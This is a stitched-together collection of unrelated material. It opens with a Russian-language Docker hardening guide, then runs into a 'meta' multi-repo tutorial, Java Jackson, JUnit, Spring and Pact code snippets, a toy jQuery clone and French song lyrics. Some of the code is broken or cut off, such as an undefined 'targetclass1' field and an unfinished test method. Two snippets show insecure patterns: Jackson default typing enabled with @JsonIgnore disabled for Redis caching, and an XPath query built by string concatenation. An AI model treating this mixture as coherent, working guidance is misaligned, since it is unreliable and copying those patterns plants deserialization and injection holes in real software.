Это руководство, посвященное безопасности Docker, разделено на три раздела. Очень приветствуются ваши комментарии, поскольку здесь представлена компиляция разных материалов, которые я особо не перепроверял.

· Раздел 1: Безопасность операционной системы хоста при взаимодействии с Docker.

· Раздел 2: Создание конфигурационного файла и контейнеров.

· Раздел 3: Функции безопасности, которые могут быть интегрированы со специфическими возможностями в Docker Enterprise.

Как было сказано выше, это руководство собрано из разных материалов, ссылки на которые указаны ниже. На полноту не претендую, но все основы затронуты. Обо всем остальном можно узнать в CIS (ссылка в конце статьи) и документации для Docker.

Docker Security Benchmark

Сценарий Docker Bench for Security представляет собой автоматический скрипт, выполняющий проверку на основе наилучших практик безопасности Docker. Этот скрипт следует рассматривать как хороший эвристический тест вашей безопасности, но не всеобъемлющим аналитическим инструментом.

Операционная система хоста

Если операционная система хоста не защищена должны образом, контейнер в Docker также не удастся защитить. Соответственно, следует придерживаться лучших практик по безопасности ОС хоста. Нелишним будет запустить несколько проверок на предмет присутствия уязвимостей в дополнение к реализации мер, указанных ниже.

Правила аудита

Создайте и используйте правила аудита для файлов, имеющих отношение к Docker, при помощи auditctl. Например, можно добавить строку «-w /usr/bin/dockerd -k docker» в файл /etc/audit.rules и перезапустить службу аудита.

Режим FIPS

Режим FIPS (Federal Information Processing Standard; Федеральный стандарт по обработке информации) принуждает криптографические утилиты к использованию алгоритмов, совместимых с федеральными и промышленными стандартами и законами безопасности. Если ваша ОС на хосте поддерживает FIPS, то вы можете включить этот режим при помощи следующей команды:

sed -i 's/GRUB_CMDLINE_LINUX="/GRUB_CMDLINE_LINUX="fips=1 /g' /etc/default/grub

grub2-mkconfig -o /boot/grub2/grub.cfg && reboot

Включить FIPS в Docker Engine можно при помощи следующей команды:

mkdir -p /etc/systemd/system/docker.service.d 2>&1; echo -e "[Service]\n Environment=\"DOCKER_FIPS=1\"" > /etc/systemd/system/docker.service.d/fips-module.conf; systemctl daemon-reload; systemctl restart docker

Более подробная информация доступна по следующим ссылкам:

· https://docs.docker.com/compliance/nist/fips140_2/ 10

· https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/chap-federal_standards_and_regulations 7

Секреты в Docker

Конфиденциальная информация должна храниться в виде секретов, созданных при помощи команды docker service create. Пример:

docker service create --label com.docker.ucp.access.label=/prod --name nginx --publish 443 --secret source=orcabank_prod_mobile.ca.pem.v1,target=ca.pem nginx

Конфигурационный файл в Docker

Если в конфигурационный файл, находящийся в /etc/docker/daemon.json, добавить опцию “icc”:false, отключится коммуникация между контейнерами с целью избежания ненужных информационных утечек.

Опция “log-level: “info” позволяет собирать все неотладочные логи.

Конфигурация, показанная ниже, разрешает удаленное подключение и отправку логов по указанному адресу:

{

"log-driver": "syslog",

"log-opts": {

"syslog-address": "udp://1.2.3.4:1111"

}

}

Эта опция сработает только если включен демон syslog. TCP и UDP принимаются в качестве параметров. Также можно воспользоваться соответствующим параметром при запуске Docker (–log-opt syslog-address=ADRESS) в рамках парадигмы доступа к контейнеру из контейнера.

Следующая опция позволяет предотвратить эскалацию привилегий посредством изоляции пространства имен для определенного пользователя:

“userns-remap”: “Your_User”

Безопасность транспортного уровня

Ограничьте подключения к демону Docker (если требуется удаленный доступ) для пользователей с доступом к учетным записям TLS клиента.

Плагины авторизации

Укажите, какие команды разрешены для какого пользователя, и создайте соответствующий плагин авторизации для Docker. Теперь при запуске демона Docker укажите созданный плагин:


dockerd --authorization-plugin=PLUGIN_ID

Подробнее о создании плагинов авторизации рассказано в документации.

Параметры демона

Демон Docker запускается с набором стандартных параметров.

--live-restore – контейнеры без демонов для максимизации доступности после выключения или перезагрузки. Эта опция облегчает установку обновлений и патчей, минимизируя время простоя.

--userland-proxy=false – когда доступны или используются hairpin NAT’ы, пользовательские прокси становятся излишними и только расширяют возможности для атак.

--no-new-privileges – запрет для контейнеров на получение дополнительных привилегий через suid или sguid.

--seccomp-profile /path/to/profile – эта опция позволяет добавить настроенный профиль seccomp.

Контейнер и конфигурационный файл

Создание пользователя

Убедитесь, что для контейнера создан пользователь, и запуск контейнера происходит от имени этого пользователя (а не от имени root).

Удаленный доступ

Не разрешайте удаленный доступ к демону. Если удаленный доступ нужен, обезопасьте этот доступ при помощи сертификатов.

Изолирование пользовательского пространства имен

Особенно важно убедиться, что в Docker изолировано пользовательское пространство имен, поскольку по умолчанию это пространство имен совместно используется с пространством имен хоста. В некоторых случаях подобную фитчу можно использовать для расширения привилегий или даже для выхода за пределы контейнера. Вы можете изолировать пользовательское пространство имен, отредактировав конфигурационный файл, как было описано выше в разделе «Конфигурационный файл в Docker». Об изолировании упоминается повторно с целью подчеркнуть важность этой меры.

Профилактические проверки

Healthcheck – мощный инструмент, используемы для проверки целостности контейнера и может быть сконфигурирован в файле dockerfile. Подобного рода проверки следует проводить периодически, чтобы контролировать корректность работы контейнера. В примере ниже после проверки возвращается 0, если сервер работает, и 1 – если не работает.

HEALTHCHECK CMD curl --fail http://localhost || exit 1

SELinux

Если SELinux поддерживается операционной системой хоста, создайте или импортируйте политику SELinux и запустите Docker в режиме демона с включенным SELinux.

docker daemon --selinux-enable

Затем вы можете запускать контейнеры Docker с опциями безопасности, как показано в примере ниже:

docker run --interactive --tty --security-opt label=level:TopSecret centos /bin/bash

Сетевые интерфейсы

По умолчанию Docker слушает на каждом сетевом интерфейсе. Поскольку в большинстве случаев трафик ожидается только на одном интерфейсе, излишне увеличивается количество возможностей для реализации атаки. Таким образом, при запуске контейнера вы можете связать порты контейнера со специфическими интерфейсами хоста, как показано ниже:

docker run --detach --publish 10.2.3.4:49153:80 nginx

Версии кэшированных образов

Когда вы загружаете образы, убедитесь, что локальная версия соответствует версии в репозитории. Иначе вы можете извлечь устаревшую кэшированную версию образа, содержащую уязвимости.

Сетевой мост

Стандартная сетевая модель docker0 уязвима к ARP спуфингу и MAC флудингу. Для решения этой проблемы создайте пользовательский сетевой мост согласно вашей спецификации, как описано по ссылке https://docs.docker.com/network/bridge/

Предупреждение о сокетах

Никогда не запускайте Docker-сокеты внутри контейнера, поскольку в этом случае в контейнере можно будет запускать Docker-команды и как следствие взаимодействовать и управлять операционной системой хоста.

Конфигурация Docker Enterprise

Docker Trust

Утилита Docker trust позволяет сгенерировать ключи для проверки криптографической целостности образов. Эти ключи можно использовать для подписи образов при помощи приватных ключей, которые проверяются при помощи публичных ключей на сервере Notary Server. Более подробная информация доступна по ссылке https://docs.docker.com/engine/security/trust/content_trust/. Включение Docker Trust в Enterprise Engine рассматривается в разделе https://docs.docker.com/engine/security/trust/content_trust/#enabling-dct-within-the-docker-enterprise-engine

Сканирование уязвимостей

В Docker Enterprise встроен сканер уязвимостей, у которого есть опция для загрузки базы CVE и запуска в офлайн режиме для сканирования образов. Сканирование образов на постоянной основе повышает уровень безопасности, когда вы своевременно реагируете на появление брешей. Более подробно можно ознакомиться по ссылке https://docs.docker.com/ee/dtr/user/manage-images/scan-images-for-vulnerabilities/

Интеграция LDAP с UCP

UCP (Universal Control Plane) можно интегрировать с LDAP для упрощенной системы аутентификации с целью избежать ненужной избыточности. Более подробная информация доступна по ссылке https://docs.docker.com/ee/ucp/admin/configure/external-auth/

Для дальнейшего чтения

Дополнительные рекомендации и наилучшие практики в сфере безопасности Docker, помимо изучения docs.docker.com, можно подчерпнуть из документа «Center for Internet Security benchmarks for Docker», который доступен на странице https://learn.cisecurity.org/benchmarks.
==============================================================================================================
https://medium.com/@patrickleet/mono-repo-or-multi-repo-why-choose-one-when-you-can-have-both-e9c77bd0c668
==============================================================================================================
@TestInstance(Lifecycle.PER_CLASS)
==============================================================================================================
meta git checkout -b feature/my-new-branch
Want to commit all changes for the feature you are working on that spans several services?
meta git commit -m 'made the feature'
meta will loop through the projects you’ve added to your .meta file, and apply the command to each of them. However, meta works for much more than just git. In fact, all meta really does, is organize your projects into a JSON file, and provide an extensible core for easily providing new functionality through plugins. meta ships with a few plugins built into the core, and more are available from the community.
Below I will walk you through the simple process of creating your first meta-repo.
Making a `meta` repository
First, let’s install meta.
npm i -g meta
Then, let’s create a new meta-repository.
mkdir yourProject && cd yourProject
meta init
This creates a .meta file with the following content.
{
 "projects": {}
}
Next, head on over to GitHub and create a new repository and push our repo.
git init
git add -A
git commit -m “init meta repo”
git remote add origin git@github.com:you/yourProject.git
git push -u origin master
Adding projects to your meta repo
Now, all you need to do is add some projects, which is as simple as running the following command, provided by the meta-project plugin. Let’s imagine we have a few services we want to add: userService, graphqlService, and appService.
meta project add userService git@github.com:you/userService.git
meta project add graphqlService git@github.com:you/graphqlService.git
meta project add appService git@github.com:you/appService.git
The above will modify the .meta file and .gitignore file to look like the following:
// .meta
{
  "projects": {
    "userService": "git@github.com:you/userService.git",
    "graphqlService": "git@github.com:you/graphqlService.git",
    "appService": "git@github.com:you/appService.git"
  }
}
// .gitignore
userService
graphqlService
appService
Commit, and push.
Sharing
Now, when you have a new developer to onboard, you can simply give them access to an appropriate meta-repo. You can make many meta-repos if you’d like. One for DevOps related projects, one with everything for an admin, one with just services for a backend engineer, or even a meta repo full of other meta repos. Slice it any way you’d like!
To clone a meta repo, simply run the following:
meta git clone git@github.com:you/yourProject.git
To sync the additional repos defined in the .meta file, run:
meta git update
==============================================================================================================
git init
git add -A
git commit -m “init meta repo”
git remote add origin git@github.com:you/yourProject.git
git push -u origin master
==============================================================================================================
System.exit(SpringApplication.exit(context, (ExitCodeGenerator) () -> 0));
==============================================================================================================
https://github.com/MarcGiffing/wicket-spring-boot
==============================================================================================================
public class TestLauncher {
    public static void main(String[] args) {
        LauncherDiscoveryRequest request
          = LauncherDiscoveryRequestBuilder.request()
          .selectors(selectClass("com.baeldung.EmployeesTest"))
          .configurationParameter(
            "junit.conditions.deactivate", 
            "com.baeldung.extensions.*")
          .build();
 
        TestPlan plan = LauncherFactory.create().discover(request);
        Launcher launcher = LauncherFactory.create();
        SummaryGeneratingListener summaryGeneratingListener
          = new SummaryGeneratingListener();
        launcher.execute(
          request, 
          new TestExecutionListener[] { summaryGeneratingListener });
  
        System.out.println(summaryGeneratingListener.getSummary());
    }
}

If we want to register an extension for all tests in our application, we can do so by adding the fully qualified name to the /META-INF/services/org.junit.jupiter.api.extension.Extension file:

1
com.baeldung.extensions.LoggingExtension
==============================================================================================================
npm i -g meta
meta git clone git@github.com:mateodelnorte/meta.git
cd ./meta
yarn
meta yarn install
meta yarn link --all
yarn link

npm i -g meta
meta git clone git@github.com:mateodelnorte/meta.git
cd ./meta
npm install
meta npm install
meta npm link --all
npm link

meta git status --include-only dir1,dir2
==============================================================================================================
echo "# mc" >> README.md
git init
git add README.md
git commit -m "first commit"
git remote add origin https://github.com/AlexRogalskiy/mc.git
git push -u origin master

git remote add origin https://github.com/AlexRogalskiy/mc.git
git push -u origin master
==============================================================================================================
public class JacksonView1 {
    public static class publicView{}

    public static class User  {
        public User(Long id, String showName, List<String> callableQueues) {
            this.id = id;
            this.showName = showName;
            this.callableQueues = callableQueues;
        }
        @JsonView(publicView.class)
        public final Long id;

        public final String showName;

        @JsonView(publicView.class)
        public final List<String> callableQueues;
    }

    public static void main(String[] args) {
        User user = new User(123l, "name", Arrays.asList("a", "b"));
        ObjectMapper mapper = new ObjectMapper();
        mapper.disable(MapperFeature.DEFAULT_VIEW_INCLUSION);
        mapper.setConfig(mapper.getSerializationConfig()
                .withView(publicView.class));
        System.out.println(mapper.convertValue(user, JsonNode.class));
    }
}
==============================================================================================================
import com.paragon.mailingcontour.commons.rest.service.mapper.DelegatedObjectMapper;
import com.paragon.microservices.distributor.system.handler.RestClientHttpRequestInterceptor;
import org.springframework.boot.web.client.RestTemplateBuilder;
import org.springframework.boot.web.client.RestTemplateCustomizer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Description;
import org.springframework.http.client.ClientHttpRequestInterceptor;
import org.springframework.http.converter.HttpMessageConverter;

import java.util.List;

@Configuration
//@ConditionalOnBean(annotation = EnableRequestLogging.class)
@Description("Paragon MicroServices Distributor Client Request configuration")
public class RestTemplateInterceptorConfiguration {

    @Bean("clientRequestInterceptorCustomizer")
    @Description("Custom RestTemplate request interceptor customizer bean")
    public RestTemplateCustomizer clientRequestInterceptorCustomizer(final List<ClientHttpRequestInterceptor> interceptors) {
        return restTemplate -> restTemplate.getInterceptors().addAll(interceptors);
    }

    @Bean
    @Description("Default client HTTP request interceptor bean")
    public ClientHttpRequestInterceptor defaultClientHttpRequestInterceptor(final DelegatedObjectMapper delegatedObjectMapper) {
        return new RestClientHttpRequestInterceptor(delegatedObjectMapper);
    }

    @Bean
    public RestTemplateBuilder restTemplateBuilder(final List<HttpMessageConverter<?>> converters, final List<RestTemplateCustomizer> customizers) {
        RestTemplateBuilder builder = new RestTemplateBuilder();
        builder = builder.additionalMessageConverters(converters);
        builder = builder.additionalCustomizers(customizers);
        return builder;
    }
}
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
//Creating a synchronizedList so that when the async resttemplate returns, there will be no concurrency issues
List<String> links = Collections.synchronizedList(new ArrayList<String>());

//CustomClientHttpRequestFactory just extends SimpleClientHttpRequestFactory but disables automatic redirects in SimpleClientHttpRequestFactory
CustomClientHttpRequestFactory customClientHttpRequestFactory = new CustomClientHttpRequestFactory();
//Setting the ThreadPoolTaskExecutor for the Async calls
org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor pool = new org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor();
pool.setCorePoolSize(5);
pool.setMaxPoolSize(10);
pool.setWaitForTasksToCompleteOnShutdown(true);
pool.initialize();
//Setting the TaskExecutor to the ThreadPoolTaskExecutor
customClientHttpRequestFactory.setTaskExecutor(pool);

ArrayList<String> references = new ArrayList<>();
ArrayList<String> links = new ArrayList<>();
AsyncRestTemplate asyncRestTemplate = new AsyncRestTemplate(customClientHttpRequestFactory); 
restTemplate.getMessageConverters().add(new StringHttpMessageConverter());
for (int i = 0; i < 10; i++) {
    Future<ResponseEntity<String>> resource = asyncRestTemplate.getForEntity(references.get(i), String.class);
    ResponseEntity<String> entity = resource.get(); //this should start up 10 threads to get the links asynchronously
    links.add(entity.getBody().toString());
}
==============================================================================================================
import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.File;
import java.io.IOException;

public class JacksonExample2 {

    public static void main(String[] args) {

        ObjectMapper mapper = new ObjectMapper();

        try {

            // JSON file to Java object
            Staff staff = mapper.readValue(new File("c:\\test\\staff.json"), Staff.class);

            // JSON string to Java object
            String jsonInString = "{\"name\":\"mkyong\",\"age\":37,\"skills\":[\"java\",\"python\"]}";
            Staff staff2 = mapper.readValue(jsonInString, Staff.class);

            // compact print
            System.out.println(staff2);

            // pretty print
            String prettyStaff1 = mapper.writerWithDefaultPrettyPrinter().writeValueAsString(staff2);

            System.out.println(prettyStaff1);


        } catch (IOException e) {
            e.printStackTrace();
        }

    }
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
mvn install:install-file -Dfile=htmlcomponent.jar -DgroupId=htmlComponent -DartifactId=htmlComponent -Dversion=1.0 -Dpackaging=jar.
==============================================================================================================
import com.jolbox.bonecp.BoneCPDataSource;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.context.embedded.*;
import org.springframework.boot.context.embedded.tomcat.TomcatEmbeddedServletContainerFactory;
import org.springframework.boot.orm.jpa.EntityScan;
import org.springframework.context.annotation.*;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.http.HttpStatus;
import org.springframework.transaction.annotation.EnableTransactionManagement;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;

import javax.sql.DataSource;

@Configuration
@ComponentScan({"com.mobenga.snowcat.web", "com.mobenga.snowcat.service"})
@PropertySource("classpath:application.properties")
@EnableAutoConfiguration
@EnableTransactionManagement
@EnableJpaRepositories("com.mobenga.snowcat.service.data.repository")
@EntityScan("com.mobenga.snowcat.service.data")
public class SnowcatMVCConfig extends WebMvcConfigurerAdapter {

    @Value("${port:8080}")
    private int port;
    @Value("jdbc:h2:${db.url}")
    private String url;
    @Value("${db.username}")
    private String username;
    @Value("${db.password}")
    private String password;

    @Bean
    public DataSource dataSource() {
        BoneCPDataSource dataSource = new BoneCPDataSource();
        dataSource.setDriverClass("org.h2.Driver");
        dataSource.setJdbcUrl(url);
        dataSource.setUsername(username);
        dataSource.setPassword(password);
        return dataSource;
    }

    public static void main(String[] args) {
        //Used by Spring Boot
        SpringApplication.run(SnowcatMVCConfig.class, args);
    }

    @Bean
    public EmbeddedServletContainerFactory servletContainer() {
        TomcatEmbeddedServletContainerFactory factory = new TomcatEmbeddedServletContainerFactory();
        factory.setPort(port);
        factory.addErrorPages(new ErrorPage(HttpStatus.NOT_FOUND, "/"));
        return factory;
    }
}
==============================================================================================================
var $ = function(selector) {
    if(this.$) {
        return new $(selector);
    }
    if(typeof selector == "string") {
        this.init = document.getElementById(selector);
    }
};
 
$.prototype = {
    text: function(text) {
        if(!text){
           this.init.innerHTML;
        }
        this.init.innerHTML = text;
        return this;
    },
    css: function(style) {
        for(var i in style){
           this.init.style[i] = style[i];
        }
        return this;
    }
};
//пример использования:
$('div').text('div').css({color: "red"});



({
    foo: function (a) {
        return a;
    }
}).foo('foo').toUpperCase();
==============================================================================================================
assertThat(strings, Matchers.<Collection<String>> allOf(
    hasSize(greaterThan(2)),
    hasItem(is("string two"))
));

assertThat("test", anyOf(is("testing"), containsString("est")));

assertThat(Long.valueOf(1), instanceOf(Integer.class));
// shortcut for instanceOf
assertThat(Long.valueOf(1), isA(Integer.class));

 @Test
    public void listShouldInitiallyBeEmpty() {
        List<Integer> list = Arrays.asList(5, 2, 4);

        assertThat(list, hasSize(3));

        // ensure the order is correct
        assertThat(list, contains(5, 2, 4));

        assertThat(list, containsInAnyOrder(2, 4, 5));

        assertThat(list, everyItem(greaterThan(1)));

    }
	
	
	
	assertThat(fellowship, everyItem(hasProperty("race", is(not((ORC))))));
	 assertThat(list, everyItem(greaterThan(1)));
	 
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
import java.util.List;
import com.mendix.systemwideinterfaces.core.IContext;
import com.mendix.webui.CustomJavaAction;
import org.jsoup.Jsoup;
import org.jsoup.select.Elements;
import org.jsoup.nodes.Element;
import org.jsoup.nodes.Document;
import com.mendix.systemwideinterfaces.core.IMendixObject;
import docugen.proxies.TemplateImage;
import com.mendix.core.Core;

public class ReplaceImages extends CustomJavaAction<java.lang.String>
{
	private java.lang.String HTML;

	public ReplaceImages(IContext context, java.lang.String HTML)
	{
		super(context);
		this.HTML = HTML;
	}

	@java.lang.Override
	public java.lang.String executeAction() throws Exception
	{
		// BEGIN USER CODE
		
		//create variables to use later
		String src;
		String base64String;
		String base64Prefix = "data:image/png;base64,";
		String base64Complete;
		
		
		//parse document
		Document doc = Jsoup.parse(HTML);
		
		//retrieve all img tags
		Elements img = doc.getElementsByTag("img");
		
		
		//loop through image tags
		 for (Element el : img) {

			 // If alt is empty or null or already has the base64 encoded
             if(el.attr("src") == null || el.attr("src").contains(base64Prefix) || el.attr("src").equals("")) {
                
            	//dont change anything if it is already base64 encoded


            	 
             } else if (el.attr("src").contains("file?guid=")){

				 //the id is stored with a prefix of file?guid= , so we split the string in two from the equal sign, and then store the object id in a variable
				 src = el.attr("src");
				 String[] parts = src.split("=");
				 String id = parts[1];

				 //retrieve mendix object list by id
				 List<IMendixObject> result = Core.retrieveXPathQuery(context(), "//DocuGen.TemplateImage[id" + "='" + id + "']");

				 //the list will always contain one object, so take the first object out of the result list
				 IMendixObject firstObj = result.get(0);

				 //Retrieve the base64 string and add the base64 prefix
				 base64String = firstObj.getValue(context(), TemplateImage.MemberNames.Base64String.toString());
				 base64Complete = base64Prefix + base64String;

				 //change the img tag to contain the base64 string
				 el.attr("src", base64Complete.toString()); 
             
             } else {
                 
                 //dont change anything

             }
			 
             
         }
         
         return doc.toString();

		// END USER CODE
	}

	/**
	 * Returns a string representation of this action
	 */
	@java.lang.Override
	public java.lang.String toString()
	{
		return "ReplaceImages";
	}

	// BEGIN EXTRA CODE
	// END EXTRA CODE
}
==============================================================================================================
public Module registerGeoJsonModule(){
return new GeoJsonModule();
}

public Set<Object> getSingletons() {
Set<Object> s = new HashSet<Object>();
JacksonJsonProvider jjp = new JacksonJsonProvider();
jjp.configure(Feature.WRITE_NULL_MAP_VALUES, false);
jjp.configure(Feature.WRITE_NULL_PROPERTIES, false);
s.add(jjp);
return s;
}

@Document(collection="cachedcodes")
public class CachedCode {

@PersistenceConstructor
public CachedCode(String code, UUID clientId, LocalDateTime expiration) {
    this.code = code;
    this.clientId = clientId;
    this.expiration = expiration;
}

public CachedCode(String code, UUID clientId, long secondsExpiring) {
    this.code = code;
    this.clientId = clientId;
    this.expiration = LocalDateTime.now().plusSeconds(secondsExpiring);
}


public UUID getClientId( ) {
    return this.clientId;
}

public String getCode() {
    return this.code;
}

public boolean hasExpired(LocalDateTime now) {
    return (expiration.isBefore(now));
}

...
@Id
private final String code;
private final UUID clientId;
private final LocalDateTime expiration;


-H "Content-Type: application/json" \
-H "Authorization: Bearer {your oauthToken}" \
-d '{"firstName":"Foo", "lastName": "Bar", "emailAddress":"foobar@example.com"}' \
'http://localhost:8080/oauth2-provider/v1.0/users/{userId}'

and the GET:

curl -v -X GET \
-H "Content-Type: application/json" \
-H "Authorization: Bearer {your oauthToken}" \
'http://localhost:8080/oauth2-provider/v1.0/users/{userId}'
==============================================================================================================
import java.io.*;
import java.util.List;

import com.fasterxml.jackson.core.*;
import com.fasterxml.jackson.databind.*;
import com.fasterxml.jackson.databind.introspect.JacksonAnnotationIntrospector;

public class JsonMarshallerUnmarshaller<T> {
    private ObjectMapper mapper;
    private Class<T> targetClass;

    public JsonMarshallerUnmarshaller(Class<T> targetClass) {
        AnnotationIntrospector introspector = new JacksonAnnotationIntrospector();

        mapper = new ObjectMapper();
        mapper.getDeserializationConfig().with(introspector);
        mapper.getSerializationConfig().with(introspector);

        this.targetClass = targetClass;
    }

    public List<T> unmarshal(String jsonString) throws JsonParseException, JsonMappingException, IOException {
        return parseList(jsonString, mapper, targetClass);
    }

    public String marshal(List<T> list) throws JsonProcessingException {
        return mapper.writeValueAsString(list);
    }

    public static <E> List<E> parseList(String str, ObjectMapper mapper, Class<E> clazz)
            throws JsonParseException, JsonMappingException, IOException {
        return mapper.readValue(str, listType(mapper, clazz));
    }

    public static <E> List<E> parseList(InputStream is, ObjectMapper mapper, Class<E> clazz)
            throws JsonParseException, JsonMappingException, IOException {
        return mapper.readValue(is, listType(mapper, clazz));
    }

    public static <E> JavaType listType(ObjectMapper mapper, Class<E> clazz) {
        return mapper.getTypeFactory().constructCollectionType(List.class, clazz);
    }
}

import java.io.*;
import java.util.*;

public class JsonMarshaller<T> {
    private static ClassLoader loader = JsonMarshaller.class.getClassLoader();

    public static void main(String[] args) {
        try {
            JsonMarshallerUnmarshaller<Station> marshaller = new JsonMarshallerUnmarshaller<>(Station.class);
            String jsonString = read(loader.getResourceAsStream("data.json"));
            List<Station> stations = marshaller.unmarshal(jsonString);
            stations.forEach(System.out::println);
            System.out.println(marshaller.marshal(stations));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @SuppressWarnings("resource")
    public static String read(InputStream ios) {
        return new Scanner(ios).useDelimiter("\\A").next(); // Read the entire file
    }
}
==============================================================================================================
Type setType = new TypeToken<Set<CategoryTl>>() {}.getType();
mapper.createTypeMap(setType, CategoryTlDTO.class).setConverter(converter);
==============================================================================================================
JsonMarshallerUnmarshaller<T> {
    T targetClass;

    public ArrayList<T> unmarshal(String jsonString) {
        ObjectMapper mapper = new ObjectMapper();

        AnnotationIntrospector introspector = new JacksonAnnotationIntrospector();
        mapper.getDeserializationConfig()
            .withAnnotationIntrospector(introspector);

        mapper.getSerializationConfig()
            .withAnnotationIntrospector(introspector);
        JavaType type = mapper.getTypeFactory().
            constructCollectionType(
                ArrayList.class, 
                targetclass.getClass());

        try {
            Class c1 = this.targetclass.getClass();
            Class c2 = this.targetclass1.getClass();
            ArrayList<T> temp = (ArrayList<T>) 
                mapper.readValue(jsonString,  type);
            return temp ;
        } catch (JsonParseException e) {
            e.printStackTrace();
        } catch (JsonMappingException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return null ;
    }  
}
==============================================================================================================
Condition notNull = ctx -> ctx.getSource() != null;
We can use the notNull Condition to specify that mapping only take place for a property if the source is not null:

typeMap.addMappings(mapper -> mapper.when(notNull).map(Person::getName, PersonDTO::setName));
In this example, mapping to setName will be skipped if the source is not null, else mapping will proceed from the source object’s getName method:

typeMap.addMappings(mapper -> mapper.when(notNull).skip(PersonDTO::setName));
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
This is a post on how to serialize and deserialize a domain object that has an attribute with the @jsonignore annotation. This is usually a problem when you use the same domain model as a view model and there is a requirement to cache the domain model. If such domain model contains an attribute with @jsonignore annotation, that attribute will not be cache if you are using a jsonserializer.
This is how to go about it:
Configure a new Object Mapper for your cache
ObjectMapper objectMapper = new ObjectMapper();
2. Create a JacksonAnnotationIntrospector subclass to ignore the annotation and override hasIgnoreMarker to always return false
public static class JsonIgnoreDisabler extends  JacksonAnnotationIntrospector {
    @Override
    public boolean hasIgnoreMarker(final AnnotatedMember m){
        return false;
    }
}
3. Set the class in the mapper
mapper.setAnnotationIntrospector(new JsonIgnoreDisabler());
4. Enable defaultTyping
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);
5. If using redis, you can set the serializer for RedisTemplate like this:
RedisTemplate redisTemplate = new RedisTemplate();
redisTemplate.setDefaultSerializer(new GenericJackson2JsonRedisSerializer(mapper));
redisTemplate.afterPropertiesSet();
You should start seeing your @jsonignore field in the cache.


	public static void main(String[] args) {

		RedisOperations<String, Object> redis = SpringApplication.run(App.class, args).getBean(RedisOperations.class);
		
		A a = new B();
		System.out.println(a);
		redis.opsForValue().set("foo", a);
		
		A aa = (A)redis.opsForValue().get("foo");
		System.out.println(aa);
		
	}
==============================================================================================================
Текст песни
Poussière vivante, je cherche en vain ma voie lactée
Dans ma tourmente, je n'ai trouvé qu'un mausolée
Et je divague
J'ai peur du vide
Je tourne des pages mais
Des pages vides
Poussière errante, je n'ai pas su me diriger
Chaque heure demande pour qui, pour quoi, se redresser
Et je divague
J'ai peur du vide
Pourquoi ces larmes, dis
À quoi bon vire?
Mais mon Dieu de quoi j'ai l'air, je sers à rien du tout
Et qui peut dire dans cet enfer ce qu'on attend de nous, j'avoue
Ne plus savoir à quoi je sers, sans doute à rien du tout
À présent je peux me taire si tout devient dégoût
Poussière brûlante, la fièvre a eu raison de moi
Je ris sans rire, je vis, je fais n'importe quoi
Et je divague
J'ai peur du vide
Je tourne des pages mais
Des pages vides
Mais mon Dieu de quoi j'ai l'air, je sers à rien du tout
Et qui peut dire dans cet enfer ce qu'on attend de nous, j'avoue
Ne plus savoir à quoi je sers, sans doute à rien du tout
À présent je peux me taire si tout devient dégoût
Mais mon Dieu de quoi j'ai l'air, je sers à rien du tout
Et qui peut dire dans cet enfer ce qu'on attend de nous, j'avoue
Ne plus savoir à quoi je sers, sans doute à rien du tout
À présent je peux me taire si tout devient dégoût
Mais mon Dieu de quoi j'ai l'air, je sers à rien du tout
Et qui peut dire dans cet enfer ce qu'on attend de nous, j'avoue
Ne plus savoir à quoi je sers, sans doute à rien du tout
À présent je peux me taire si tout devient dégoût
==============================================================================================================
import au.com.dius.pact.consumer.Pact;
import au.com.dius.pact.consumer.PactProviderRuleMk2;
import au.com.dius.pact.consumer.PactVerification;
import au.com.dius.pact.consumer.dsl.PactDslWithProvider;
import au.com.dius.pact.model.RequestResponsePact;
import org.junit.Rule;
import org.junit.Test;
import org.springframework.http.*;
import org.springframework.web.client.RestTemplate;

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

public class PactConsumerDrivenContractUnitTest {

    @Rule
    public final PactProviderRuleMk2 mockProvider = new PactProviderRuleMk2("test_provider", "localhost", 8080, this);

    @Pact(consumer = "test_consumer")
    public RequestResponsePact createPact(final PactDslWithProvider builder) {
        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Content-Type", "application/json");

        return builder.given("test GET", Collections.singletonMap("test-name", "test-value")).uponReceiving("GET REQUEST").path("/pact")
                .method("GET").willRespondWith().status(200)
                .headers(headers).body("{\"condition\": true, \"name\": \"tom\"}").given("test POST").uponReceiving("POST REQUEST").method("POST")
                .headers(headers).body("{\"name\": \"Michael\"}").path("/pact").willRespondWith().status(201).toPact();
    }

    @Test
    @PactVerification()
    public void givenGet_whenSendRequest_shouldReturn200WithProperHeaderAndBody() {
        // when
        final ResponseEntity<String> response = new RestTemplate().getForEntity(mockProvider.getUrl() + "/pact", String.class);

        // then
        assertThat(response.getStatusCode().value()).isEqualTo(200);
        assertThat(response.getHeaders().get("Content-Type").contains("application/json")).isTrue();
        assertThat(response.getBody()).contains("condition", "true", "name", "tom");

        // and
        final HttpHeaders httpHeaders = new HttpHeaders();
        httpHeaders.setContentType(MediaType.APPLICATION_JSON);

        final String jsonBody = "{\"name\": \"Michael\"}";

        // when
